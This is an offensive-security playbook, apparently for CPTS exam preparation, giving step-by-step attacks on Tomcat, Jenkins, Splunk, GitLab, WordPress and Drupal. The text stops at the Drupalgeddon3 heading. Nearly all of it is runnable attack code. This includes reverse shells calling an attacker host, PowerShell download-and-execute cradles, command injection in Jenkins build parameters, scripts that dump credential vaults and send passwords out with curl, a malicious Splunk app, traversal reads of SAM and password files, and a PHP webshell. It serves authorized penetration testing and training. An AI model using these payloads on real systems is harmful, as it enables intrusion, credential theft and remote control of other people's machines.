# Attacking Common Applications

Per-application playbook for the most common application targets in CPTS engagements. Each phase covers: enumeration, default credentials, version-specific CVEs, exploitation, and post-exploit pivots. LOTL/manual exploitation is given alongside the dedicated tool whenever practical.

Cross-references:
- [web-methodology.md](web-methodology.md) — generic web testing
- [enumeration-methodology.md](enumeration-methodology.md) — service identification
- [shells-and-payloads.md](shells-and-payloads.md) — payload delivery
- [tunneling-pivoting.md](tunneling-pivoting.md) — pivoting through compromised app hosts
- [linux-methodology.md](linux-methodology.md) / [windows-methodology.md](windows-methodology.md) — post-exploit

> **Note:** Always verify the target version against the CVE before attempting an exploit. Failed exploits can crash services and burn opportunities. Use `searchsploit -m` and read the PoC source first.

## Table of Contents

- [Phase 1: Apache Tomcat](#phase-1-apache-tomcat)
- [Phase 2: Jenkins](#phase-2-jenkins)
- [Phase 3: Splunk](#phase-3-splunk)
- [Phase 4: GitLab](#phase-4-gitlab)
- [Phase 5: WordPress](#phase-5-wordpress)
- [Phase 6: Drupal](#phase-6-drupal)
- [Phase 7: Joomla](#phase-7-joomla)
- [Phase 7b: Generic CMS — Auth Admin → Extension Archive Upload → RCE](#phase-7b-generic-cms--auth-admin--extension-archive-upload--rce)
- [Phase 8: Atlassian Confluence](#phase-8-atlassian-confluence)
- [Phase 9: Atlassian Jira](#phase-9-atlassian-jira)
- [Phase 10: JBoss / Wildfly](#phase-10-jboss--wildfly)
- [Phase 11: Oracle WebLogic](#phase-11-oracle-weblogic)
- [Phase 12: Adobe ColdFusion](#phase-12-adobe-coldfusion)
- [Phase 13: PRTG Network Monitor](#phase-13-prtg-network-monitor)
- [Phase 14: Cacti](#phase-14-cacti)
- [Phase 14b: WSUS Server — CVE-2025-59287](#phase-14b-wsus-server--cve-2025-59287-unauth-system-rce)
- [Phase 14c: Jupyter Notebook / JupyterLab](#phase-14c-jupyter-notebook--jupyterlab)
- [Phase 14d: Apache Struts2](#phase-14d-apache-struts2)
- [Phase 14e: Apache HTTPD (Modern CVEs)](#phase-14e-apache-httpd-modern-cves)
- [Phase 14f: phpMyAdmin](#phase-14f-phpmyadmin)
- [Phase 14g: Spring Boot Actuator](#phase-14g-spring-boot-actuator)
- [Phase 14h: Elasticsearch & Kibana](#phase-14h-elasticsearch--kibana)
- [Phase 14i: Container & Orchestrator](#phase-14i-container--orchestrator)
- [Phase 14j: Apache CouchDB](#phase-14j-apache-couchdb)
- [Phase 14k: Xdebug Debugger — Pre-Auth RCE](#phase-14k-xdebug-debugger--pre-auth-rce)
- [Phase 14l: H2 Database Console](#phase-14l-h2-database-console-standalone)
- [Phase 14m: Node-RED](#phase-14m-node-red-port-1880)
- [Phase 14n: PowerShell Web Access (PSWA)](#phase-14n-powershell-web-access-pswa)
- [Phase 14o: Zabbix](#phase-14o-zabbix--frontend-json-rpc-api--agent-10050-rce)
- [Phase 14p: Moodle](#phase-14p-moodle)
- [Phase 14q: Microsoft SharePoint](#phase-14q-microsoft-sharepoint--pre-auth-enumeration)
- [Phase 14r: Haraka SMTP](#phase-14r-haraka-smtp--attachment-plugin-rce-cve-2016-1000282)
- [Phase 14s: PostgreSQL — Post-Auth File R/W & RCE Primitives](#phase-14s-postgresql--post-auth-file-rw--rce-primitives)
- [Phase 14t: Oracle Database (TNS Listener)](#phase-14t-oracle-database-tns-listener--tcp-1521)
- [Phase 14u: Webmin / MiniServ](#phase-14u-webmin--miniserv-tcp-10000)
- [Phase 14v: Microsoft SQL Server (TCP 1433)](#phase-14v-microsoft-sql-server-tcp-1433)
- [Phase 14w: Openfire XMPP Server](#phase-14w-openfire-xmpp-server-tcp-90909091)
- [Phase 14x: PHP-CGI Argument Injection — CVE-2024-4577](#phase-14x-php-cgi-argument-injection--cve-2024-4577)
- [Phase 14y: PHP-FPM + Nginx Underflow RCE — CVE-2019-11043](#phase-14y-php-fpm--nginx-underflow-rce--cve-2019-11043)
- [Phase 14z: Misc App CVEs (aiohttp, Git, CUPS, CrushFTP, Erlang, daloRADIUS, OpenSMTPD, OpenTSDB, PaperCut, phpLiteAdmin, PHPUnit, ZoneMinder)](#phase-14z-openfire--misc-app-cves--continued)
- [Phase 15: Quick Reference — osTicket / MantisBT / OpenCart / Magento](#phase-15-quick-reference--osticket--mantisbt--opencart--magento)
- [Phase 16: Generic CVE Lookup Workflow](#phase-16-generic-cve-lookup-workflow)
- [Quick Reference Cheatsheet](#quick-reference-cheatsheet)

---

## Phase 1: Apache Tomcat

### Enumeration

```bash
# Identify Tomcat
curl -s -I http://<TARGET>:8080/ | grep -i server
curl -s http://<TARGET>:8080/docs/                            # default docs
curl -s http://<TARGET>:8080/manager/html -I                  # 401 if installed
curl -s http://<TARGET>:8080/host-manager/html -I

# Version banner (often in 404 page footer)
curl -s http://<TARGET>:8080/nonexistent | grep -i tomcat

# Examples + status pages
curl -s http://<TARGET>:8080/examples/servlets/
curl -s http://<TARGET>:8080/manager/status

# nmap NSE
nmap -p 8080 --script http-tomcat-versions,http-default-accounts,http-vuln-cve2017-5638 <TARGET>
```

### Default Credentials

```text
tomcat:tomcat
tomcat:s3cret
admin:admin
admin:password
manager:manager
role1:role1
both:both
```

```bash
# Spray default creds
hydra -L /usr/share/seclists/Usernames/tomcat-betterdefaultpasslist/users.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/tomcat-betterdefaultpasslist/passwords.txt \
      <TARGET> -s 8080 http-get /manager/html

# nxc
nxc http <TARGET> -u tomcat -p tomcat --port 8080
```

### Exploitation — WAR Upload (auth Manager)

```bash
# Generate WAR shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war

# Upload via tomcatWarDeployer
tomcatWarDeployer.py -U tomcat -P tomcat -H <ATTACKER_IP>:4444 http://<TARGET>:8080/

# LOTL — manual curl
curl -u tomcat:tomcat -T shell.war "http://<TARGET>:8080/manager/text/deploy?path=/shell"
nc -lvnp 4444
curl http://<TARGET>:8080/shell/
# Cleanup
curl -u tomcat:tomcat "http://<TARGET>:8080/manager/text/undeploy?path=/shell"
```

### Exploitation — Ghostcat (CVE-2020-1938)

```bash
# AJP file read / RCE on port 8009
nmap -p 8009 --script ajp-auth,ajp-headers,ajp-methods,ajp-request <TARGET>
python3 ghostcat.py -p 8009 -f WEB-INF/web.xml <TARGET>
# searchsploit ghostcat
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2020-1938 | 6.x/7.x/8.x/9.x AJP enabled | Ghostcat — file read, sometimes RCE |
| CVE-2017-12617 | 7.0.0–7.0.79 (PUT enabled) | Direct JSP upload via PUT |
| CVE-2019-0232 | 7.0.0–9.0.17 Windows, CGIServlet | Argument injection RCE |

### Reverse-Proxy Semicolon Path Traversal (..;/) — Hidden App Bypass

When Tomcat sits behind Nginx, Apache, or a load balancer, the proxy normalizes paths before forwarding but Tomcat treats `;` as a path parameter delimiter. This desync lets you reach restricted contexts (`/manager`, `/host-manager`, `/examples`) that the proxy blocks by prefix match.

```bash
# Basic bypass — proxy denies /manager/html but passes /anything/..;/manager/html
curl -s http://<TARGET>:8080/anything/..;/manager/html
curl -s http://<TARGET>:8080/whatever/..;/manager/html -I
curl -s http://<TARGET>:8080/foo/..;/host-manager/html -I

# Double-bypass variants (when single ..;/ is filtered)
curl -s "http://<TARGET>:8080/;param=value/manager/html"
curl -s "http://<TARGET>:8080/..;/..;/manager/html"
curl -s "http://<TARGET>:8080/%2e%2e;/manager/html"

# Reach /examples (often left enabled, contains session-fixation demos)
curl -s "http://<TARGET>:8080/foo/..;/examples/servlets/"
curl -s "http://<TARGET>:8080/foo/..;/examples/jsp/snp/snoop.jsp"

# Chain with default creds once /manager is reachable
curl -u tomcat:tomcat "http://<TARGET>:8080/foo/..;/manager/text/list"
curl -u tomcat:tomcat -T shell.war "http://<TARGET>:8080/foo/..;/manager/text/deploy?path=/pwn"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — no tools needed. Fuzz path-parameter positions manually:
for prefix in "/a/..;" "/a/..;/" "/..;a/../" "/;/"; do
  CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://<TARGET>:8080${prefix}/manager/html")
  echo "$prefix/manager/html -> $CODE"
done
```

### Post-Exploit

```bash
# Tomcat runs as user `tomcat` typically — check
id; cat /etc/tomcat*/tomcat-users.xml
find / -name tomcat-users.xml 2>/dev/null
# Often contains plaintext manager creds reusable elsewhere
```

---

## Phase 2: Jenkins

### 2.1 Enumeration

```bash
# Ports: 8080 (web), 50000 (JNLP agent)
curl -s -I http://<TARGET>:8080/ | grep -i 'X-Jenkins'              # version header
curl -s http://<TARGET>:8080/login                                  # version in HTML footer
curl -s http://<TARGET>:8080/api/json | jq

# Anonymous-readable endpoints
curl -s http://<TARGET>:8080/asynchPeople/api/json | jq             # users
curl -s http://<TARGET>:8080/people/
curl -s http://<TARGET>:8080/computer/api/json?depth=1 | jq         # build agents
curl -s http://<TARGET>:8080/me/api/json                            # 200 = anon
curl -s http://<TARGET>:8080/securityRealm/user/admin/api/json
curl -s http://<TARGET>:8080/script                                 # 200 = anon Script Console
curl -s http://<TARGET>:8080/scriptText                             # 405 = exists, POST-only
curl -s http://<TARGET>:8080/manage
curl -s "http://<TARGET>:8080/job/<JOB>/config.xml"
curl -s "http://<TARGET>:8080/job/<JOB>/api/json?depth=1"

nmap -p 8080 --script http-jenkins-* <TARGET>

# Plugin enumeration
curl -s -u admin:admin "http://<TARGET>:8080/pluginManager/api/json?depth=1" | \
  jq -r '.plugins[] | "\(.shortName)\t\(.version)\t\(.active)"'
```

### 2.2 Default / Common Credentials

```text
admin:admin
admin:password
jenkins:jenkins
root:jenkins
admin:<contents of /var/jenkins_home/secrets/initialAdminPassword>
```

### 2.3 Script Console RCE (`/script` and `/scriptText`)

```groovy
// === LINUX target — bash reverse shell ===
String host="<ATTACKER_IP>"; int port=4444; String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};p.destroy();s.close();

// === WINDOWS target — PowerShell IEX revshell ===
def cmd = ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass",
           "-c", "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/rs.ps1')"]
def proc = cmd.execute()
proc.waitFor()
println proc.in.text

// === WINDOWS target — base64 PowerShell one-liner (no callback to web server) ===
// Generate locally:  echo -n '<PS_CMD>' | iconv -t UTF-16LE | base64 -w0
"powershell -e <BASE64>".execute()

// === Quick command + capture stdout (useful for `whoami`, env vars, file reads) ===
println "whoami".execute().text
println "ipconfig /all".execute().text
println new File("/etc/passwd").text
println new File("C:\\Users\\Administrator\\Desktop\\flag.txt").text

// === Read environment variables (build-pipeline secrets often live here) ===
System.getenv().each { k, v -> println "$k=$v" }

// === List Jenkins agents ===
Jenkins.instance.computers.each { c ->
  println "${c.name}\t${c.node?.labelString}\t${c.node?.numExecutors}\t${c.offline}"
}
```

```bash
# === Submit Groovy via curl ===
# Anonymous:
curl -s -d "script=$(cat shell.groovy)" --data-urlencode "Submit=Run" \
  http://<TARGET>:8080/scriptText

# Authenticated:
curl -s -u admin:admin -d "script=$(cat shell.groovy)" --data-urlencode "Submit=Run" \
  http://<TARGET>:8080/scriptText

# CSRF crumb (required on 2.176+ for non-API-token auth):
CRUMB=$(curl -s -u admin:admin "http://<TARGET>:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)")
curl -s -u admin:admin -H "$CRUMB" \
  --data-urlencode "script=println 'id'.execute().text" \
  http://<TARGET>:8080/scriptText

# Quick one-liner:
curl -u admin:admin --data-urlencode 'script=println "id".execute().text' \
  http://<TARGET>:8080/scriptText
```

### 2.4 jenkins-cli.jar RCE

```bash
# Pull version-matched CLI
curl -O http://<TARGET>:8080/jnlpJars/jenkins-cli.jar

echo 'println "id".execute().text' > cmd.groovy
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:admin groovy = < cmd.groovy

# API token auth
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:<API_TOKEN> who-am-i

# Other commands
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:admin help
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:admin list-jobs
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:admin get-job <JOB>
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -auth admin:admin build <JOB> -p PARAM=value
```

### 2.5 CVE-2024-23897 — Pre-Auth Arbitrary File Read

Jenkins LTS ≤ 2.426.2 / weekly ≤ 2.441 — `args4j` `@<filename>` arg substitution leaks file content in CLI error output.

```bash
# Confirm vuln
curl -s -I http://<TARGET>:8080/ | grep -i x-jenkins

# Read /etc/passwd
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -webSocket connect-node "@/etc/passwd"

# Read user hashes
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -webSocket help "@/var/lib/jenkins/users/users.xml"
java -jar jenkins-cli.jar -s http://<TARGET>:8080/ -webSocket help "@/var/lib/jenkins/users/admin_*/config.xml"

# Public PoC
# https://github.com/h4x0r-dz/CVE-2024-23897
python3 cve-2024-23897.py -u http://<TARGET>:8080/ -p /var/jenkins_home/secret.key

# Crack bcrypt hash from users.xml
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

### 2.6 Build Step Command Injection (Job/Configure or Build-with-Parameters)

```bash
# Find injectable parameter
curl -s -u <USERNAME>:<PASSWORD> "http://<TARGET>:8080/job/<JOB>/config.xml" | \
  grep -A3 'StringParameter\|ChoiceParameter\|ExecuteShell\|BatchFile'

# Linux build step (inject ;<CMD>;):
curl -s -u <USERNAME>:<PASSWORD> -X POST "http://<TARGET>:8080/job/<JOB>/buildWithParameters?BRANCH=main;bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/4444%200%3E%261';"

# Windows batch step (inject &<CMD>&):
curl -s -u <USERNAME>:<PASSWORD> -X POST "http://<TARGET>:8080/job/<JOB>/buildWithParameters?BRANCH=main%26powershell%20-e%20<BASE64>%26"

# Read console output
curl -s -u <USERNAME>:<PASSWORD> "http://<TARGET>:8080/job/<JOB>/lastBuild/consoleText"
```

### 2.7 Lateral Movement — Controller → Build Agents

```groovy
// === Enumerate agents from the Script Console ===
Jenkins.instance.computers.each { c ->
  println "${c.name}\tos=${c.systemProperties?.get('os.name')}\tarch=${c.systemProperties?.get('os.arch')}\tonline=${!c.offline}\tlabels=${c.node?.labelString}"
}

// === Execute a shell command on a SPECIFIC agent ===
def agent = Jenkins.instance.getNode("<AGENT_NAME>")
def channel = agent.toComputer().getChannel()

// Linux agent — bash command + capture
println channel.call(new hudson.util.RemotingDiagnostics$Script("'id'.execute().text"))

// Windows agent — PowerShell command
println channel.call(new hudson.util.RemotingDiagnostics$Script(
  "['powershell.exe', '-c', 'whoami /all'].execute().text"
))

// === Execute on EVERY agent (sweep) ===
Jenkins.instance.computers.findAll { !it.offline && it.name != "" }.each { c ->
  try {
    def out = c.channel.call(new hudson.util.RemotingDiagnostics$Script("'whoami'.execute().text"))
    println "[${c.name}] ${out}"
  } catch (e) { println "[${c.name}] ERROR: ${e.message}" }
}

// === Drop a reverse shell onto an agent ===
def agent = Jenkins.instance.getNode("<AGENT_NAME>")
def script = '''
  String host="<ATTACKER_IP>"; int port=4445; String cmd="/bin/bash";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s=new Socket(host,port);
  // ... (full revshell groovy as in 2.3)
'''
agent.toComputer().channel.call(new hudson.util.RemotingDiagnostics$Script(script))
```

```bash
# === Same effect via a one-shot "freestyle" job pinned to an agent ===
# Useful when Script Console is locked down but Job/Create+Configure is not
curl -s -u admin:admin -X POST "http://<TARGET>:8080/createItem?name=pwn" \
  -H "Content-Type: application/xml" --data-binary @<(cat <<'EOF'
<project>
  <assignedNode><AGENT_NAME></assignedNode>
  <canRoam>false</canRoam>
  <builders>
    <hudson.tasks.Shell>
      <command>bash -i &gt;&amp; /dev/tcp/<ATTACKER_IP>/4444 0&gt;&amp;1</command>
    </hudson.tasks.Shell>
  </builders>
</project>
EOF
)
curl -s -u admin:admin -X POST "http://<TARGET>:8080/job/pwn/build"
```

### 2.8 Credential Vault Extraction

```groovy
// === Dump ALL credentials from /script (cleartext) ===
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.plugins.credentials.domains.*
import org.jenkinsci.plugins.plaincredentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*

CredentialsProvider.lookupStores(Jenkins.instance).each { store ->
  store.getCredentials(Domains.global()).each { c ->
    println "ID: ${c.id}"
    println "Type: ${c.class.simpleName}"
    println "Description: ${c.description}"
    if (c instanceof UsernamePasswordCredentialsImpl) {
      println "Username: ${c.username}"
      println "Password: ${c.password.plainText}"
    } else if (c instanceof BasicSSHUserPrivateKey) {
      println "Username: ${c.username}"
      println "Passphrase: ${c.passphrase?.plainText}"
      println "Private Key:\n${c.privateKey}"
    } else if (c instanceof StringCredentialsImpl) {
      println "Secret: ${c.secret.plainText}"
    } else if (c instanceof FileCredentialsImpl) {
      println "Filename: ${c.fileName}"
      println "Content:\n${new String(c.secretBytes.plainData)}"
    }
    println "---"
  }
}
```

```bash
# === Offline decryption ===
# Files needed:
#   /var/lib/jenkins/secrets/master.key
#   /var/lib/jenkins/secrets/hudson.util.Secret
#   /var/lib/jenkins/credentials.xml

# https://github.com/hoto/jenkins-credentials-decryptor
go install github.com/hoto/jenkins-credentials-decryptor@latest
jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c credentials.xml

# Windows controllers — same files at:
#   C:\ProgramData\Jenkins\.jenkins\secrets\master.key
#   C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret
#   C:\ProgramData\Jenkins\.jenkins\credentials.xml
#   C:\Users\<USER>\.jenkins\...                       (per-user install)
```

### 2.9 Pipeline Credential Leakage (Job/Configure rights)

```groovy
// Modify Jenkinsfile / pipeline to leak credential the job has access to
pipeline {
  agent any
  stages {
    stage('leak') {
      steps {
        withCredentials([usernamePassword(credentialsId: '<CRED_ID>', usernameVariable: 'U', passwordVariable: 'P')]) {
          sh 'echo -n $U | base64'
          sh 'echo -n $P | base64'                    // bypasses Jenkins exact-match masker
          sh 'echo -n $P | xxd'
          sh 'curl -s -d "p=$P" http://<ATTACKER_IP>:8000/'
        }
      }
    }
  }
}
```

```bash
# Find which creds a job uses
curl -s -u <USERNAME>:<PASSWORD> "http://<TARGET>:8080/job/<JOB>/config.xml" | \
  grep -iE 'credentialsId|sshUser|withCredentials'
```

### 2.10 Windows Privesc Check (when controller is Windows)

```groovy
println "whoami /all".execute().text
println "whoami /priv".execute().text          // SeImpersonatePrivilege → GodPotato/PrintSpoofer

// If SYSTEM-impersonation primitive needed:
def cmd = ['cmd.exe', '/c',
           'C:\\Windows\\Temp\\GodPotato.exe -cmd "cmd /c whoami > C:\\Windows\\Temp\\out.txt"']
cmd.execute().waitFor()
println new File('C:\\Windows\\Temp\\out.txt').text
```

### 2.11 Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| **CVE-2024-23897** | LTS ≤ 2.426.2 / weekly ≤ 2.441 | Pre-auth file read via args4j `@filename` (see 2.5) |
| CVE-2018-1000861 | < 2.138.x | Pre-auth RCE via Stapler |
| CVE-2017-1000353 | < 2.46.x | Java deserialization in CLI |
| CVE-2019-1003000 | Pipeline ≤ 2.59 | Sandbox bypass → RCE via Groovy compiler |
| CVE-2019-1003029 | Script Security ≤ 1.49 | Sandbox bypass via meta-programming |
| CVE-2018-1000600 | GitHub Plugin ≤ 1.29.4 | Credential disclosure via SSRF |

### 2.12 Post-Exploit Filesystem Map

```bash
# Linux
/var/lib/jenkins/secrets/master.key
/var/lib/jenkins/secrets/hudson.util.Secret
/var/lib/jenkins/secrets/initialAdminPassword
/var/lib/jenkins/credentials.xml
/var/lib/jenkins/users/users.xml
/var/lib/jenkins/users/*/config.xml
/var/lib/jenkins/jobs/*/config.xml
/var/lib/jenkins/jobs/*/builds/lastSuccessfulBuild/log

# Windows
C:\ProgramData\Jenkins\.jenkins\secrets\master.key
C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret
C:\ProgramData\Jenkins\.jenkins\credentials.xml
C:\Users\<USER>\.jenkins\...
C:\Program Files\Jenkins\jenkins.xml
```

```groovy
// === Generate persistent admin API token ===
def u = hudson.model.User.get("admin")
def p = u.getProperty(jenkins.security.ApiTokenProperty.class)
def t = p.tokenStore.generateNewToken("perm-${System.currentTimeMillis()}")
println "Token: ${t.plainValue}"

// === Dump in-memory user hashes ===
println jenkins.model.Jenkins.instance.securityRealm.allUsers.collect { u ->
  "${u.id}: ${u.properties.find { it.class.simpleName.contains('PasswordHash') }}"
}.join('\n')
```

---

## Phase 3: Splunk

### Enumeration

```bash
# Default ports: 8000 (Web), 8089 (mgmt), 8088 (HEC), 9997 (forwarder)
curl -sk https://<TARGET>:8000/en-US/account/login                   # Web UI
curl -sk https://<TARGET>:8089/services/server/info | grep version   # Version

# nmap
nmap -p 8000,8088,8089 -sV <TARGET>
```

### Default Credentials

```text
admin:changeme   (Splunk pre-7.1)
admin:admin
admin:Welcome1
```

### Exploitation — Universal Forwarder Misconfig

Forwarders that accept management connections without auth allow arbitrary script deployment to monitored hosts.

```bash
# Splunk Whisperer2 — abuse misconfigured deployment server
git clone https://github.com/cnotin/SplunkWhisperer2
python3 PySplunkWhisperer2_remote.py --host <TARGET> --username admin --password changeme --payload "id"
python3 PySplunkWhisperer2_remote.py --host <TARGET> --lhost <ATTACKER_IP> --payload "powershell -c <REVSHELL>"
```

### Exploitation — Authenticated RCE via Custom App

Auth admin can upload a Splunk app (.spl/.tar.gz) containing Python script that executes on install.

```bash
# Build malicious app
mkdir -p evil/bin
cat > evil/default/inputs.conf <<'EOF'
[script://./bin/rev.sh]
disabled = 0
interval = 60
EOF
cat > evil/bin/rev.sh <<'EOF'
#!/bin/sh
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF
chmod +x evil/bin/rev.sh
tar czf evil.spl evil/

# Upload via API
curl -sku admin:changeme -F "name=@evil.spl" \
  https://<TARGET>:8089/services/apps/local
```

### CVE-2024-36991 — Pre-Auth Arbitrary File Read (Windows)

Splunk Enterprise on Windows < 9.2.2 / 9.1.5 / 9.0.10. The `/en-US/modules/messaging/` endpoint passes user-controlled path segments through `os.path.join` without sanitization, allowing directory traversal to read arbitrary files as the Splunk service account (often SYSTEM on Windows).

```bash
# Confirm vulnerable version first
curl -sk https://<TARGET>:8089/services/server/info | grep -oP 'version">\K[^<]+'

# Read win.ini (baseline proof)
curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../windows/win.ini"

# Read Splunk passwd file (contains hashes)
curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../Program%20Files/Splunk/etc/passwd"

# Read SAM (SYSTEM context — may be locked; try backup)
curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../windows/repair/SAM"

# Read web.conf for session signing keys
curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../Program%20Files/Splunk/etc/system/local/web.conf"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl only — no tools needed beyond the HTTP request
# Enumerate common sensitive files on Windows Splunk installs
for f in "windows/win.ini" "windows/system32/drivers/etc/hosts" "Program%20Files/Splunk/etc/passwd" "Program%20Files/Splunk/etc/system/local/server.conf"; do
  echo "=== $f ==="
  curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../$f"
done
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2024-36991 | Enterprise < 9.2.2 / 9.1.5 / 9.0.10 (Windows) | Pre-auth file read via os.path.join traversal |
| CVE-2023-46214 | 9.x < 9.0.7 / 9.1.2 | XSLT RCE |
| CVE-2022-43571 | UF / Enterprise | Arbitrary command execution |
| CVE-2018-11409 | < 7.0.1 | Info disclosure (`/services/server/info`) |

### Post-Exploit

```bash
# Splunk runs typically as `splunk` user; cleartext creds in:
/opt/splunk/etc/passwd
/opt/splunk/etc/system/local/server.conf       # pass4SymmKey
/opt/splunk/etc/auth/                           # private keys
```

---

## Phase 4: GitLab

### Enumeration

```bash
# Version exposure
curl -s http://<TARGET>/help | grep -oP 'GitLab \d+\.\d+\.\d+'
curl -s http://<TARGET>/api/v4/version                                # auth required
curl -s http://<TARGET>/users/sign_in                                 # login page often shows version footer
curl -s http://<TARGET>/-/manifest.json

# User enumeration via API (often unauth)
curl -s "http://<TARGET>/api/v4/users?per_page=100" | jq '.[].username'

# Project enumeration
curl -s "http://<TARGET>/api/v4/projects?per_page=100" | jq '.[] | {name,path_with_namespace,visibility}'

# Public snippets
curl -s "http://<TARGET>/api/v4/snippets/public"
```

### Exploitation — CVE-2021-22205 (Unauth RCE via ExifTool)

GitLab CE/EE 11.9 – 13.10.2 — image upload triggers ExifTool which parses DjVu, RCE as `git` user.

```bash
# searchsploit
searchsploit gitlab 2021-22205
searchsploit -m php/webapps/49951.py

# PoC
python3 49951.py --target http://<TARGET> --lhost <ATTACKER_IP> --lport 4444

# Manual confirmation
curl -s "http://<TARGET>/users/sign_in" | grep "csrf"
# Upload crafted DjVu file via /uploads/user endpoint
```

### Exploitation — CVE-2023-7028 (Account Takeover)

GitLab 16.1.x → 16.7.2 — password reset email could be sent to any attacker-controlled email.

```bash
# Submit reset with both legit + attacker email — token sent to attacker
curl -s -X POST http://<TARGET>/users/password \
  -d "user[email][]=victim@corp.local&user[email][]=attacker@evil.com"
# Receive token at attacker email → reset password → take over admin if victim is admin
```

### GraphQL Enumeration

```bash
# Introspection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  http://<TARGET>/api/graphql | jq

# User enum via GraphQL
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{users{nodes{username,name,email}}}"}' \
  http://<TARGET>/api/graphql | jq
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2024-0402 | 16.0–16.5.6 / 16.6–16.6.4 / 16.7–16.7.2 | Arbitrary file write authenticated |
| CVE-2023-7028 | 16.1.x–16.7.2 | Account takeover via reset |
| CVE-2022-2884 | 11.3.4+ | Authenticated RCE via GitHub import |
| CVE-2021-22205 | 11.9–13.10.2 | Unauth RCE (ExifTool) |
| CVE-2020-10977 | 8.5–12.9 | Auth path traversal → RCE |

### Post-Exploit

```bash
# Runs as `git` user
sudo -l                                    # often allows `gitlab-rails` / `gitlab-rake`
sudo gitlab-rails console                  # full admin
> user = User.find_by(username:'root')
> user.password='Newpass!'; user.save!

# Database creds
cat /etc/gitlab/gitlab-secrets.json
cat /var/opt/gitlab/gitlab-rails/etc/secrets.yml
```

---

## Phase 5: WordPress

> Generic WP material lives in [web-methodology.md](web-methodology.md). This phase focuses on advanced + plugin-specific.

### XML-RPC Pingback Abuse

```bash
# Discover
curl -s http://<TARGET>/xmlrpc.php
curl -s -X POST http://<TARGET>/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName></methodCall>"

# wp.getUsersBlogs — credential brute force without account lockout
curl -s -X POST http://<TARGET>/xmlrpc.php -d \
'<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>admin</value></param><param><value>password</value></param></params>
</methodCall>'

# pingback.ping — SSRF / DDoS pivot
curl -s -X POST http://<TARGET>/xmlrpc.php -d \
'<methodCall><methodName>pingback.ping</methodName>
<params><param><value>http://<ATTACKER_IP>:8000/</value></param>
<param><value>http://<TARGET>/?p=1</value></param></params>
</methodCall>'
```

### wpscan Refresher

```bash
wpscan --url http://<TARGET> --enumerate u,p,t,vp,vt --api-token <TOKEN>
wpscan --url http://<TARGET> -U users.txt -P pass.txt
wpscan --url http://<TARGET> --passwords pass.txt --usernames admin --max-threads 10
```

### Plugin RCE Examples

```bash
# CVE-2021-24762 (Perfmatters < 1.8.5) — auth options update
# CVE-2022-0739 (BookingPress < 1.0.11) — unauth SQLi
# CVE-2024-25600 (Bricks Builder < 1.9.6.1) — unauth RCE
# Always reference: https://wpscan.com/vulnerabilities or wpscan API

# Generic plugin RCE template (after auth admin/editor):
# Theme editor → 404.php → paste <?php system($_GET['c']); ?> → /wp-content/themes/<theme>/404.php?c=id
```

### Post-Exploit

```bash
cat wp-config.php                      # DB creds + secrets
mysql -u <USERNAME> -p<PASSWORD> <DB_NAME> -e "SELECT user_login,user_pass FROM wp_users;"
# Crack: hashcat -m 400 wp_hashes.txt rockyou.txt
```

---

## Phase 6: Drupal

### Enumeration

```bash
curl -s http://<TARGET>/CHANGELOG.txt | head
curl -s http://<TARGET>/core/CHANGELOG.txt | head           # D8+
curl -sI http://<TARGET>/                                   # X-Generator: Drupal 7

# droopescan
droopescan scan drupal -u http://<TARGET>
```

### Drupalgeddon2 — CVE-2018-7600

Drupal 7.x < 7.58, 8.x < 8.3.9 / 8.4.6 / 8.5.1 — pre-auth RCE via Form API rendering.

```bash
searchsploit drupalgeddon2
searchsploit -m php/webapps/44449.rb

# Ruby PoC
ruby 44449.rb http://<TARGET>/

# msf
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
```

### Drupalgeddon3 — CVE-2018-7602

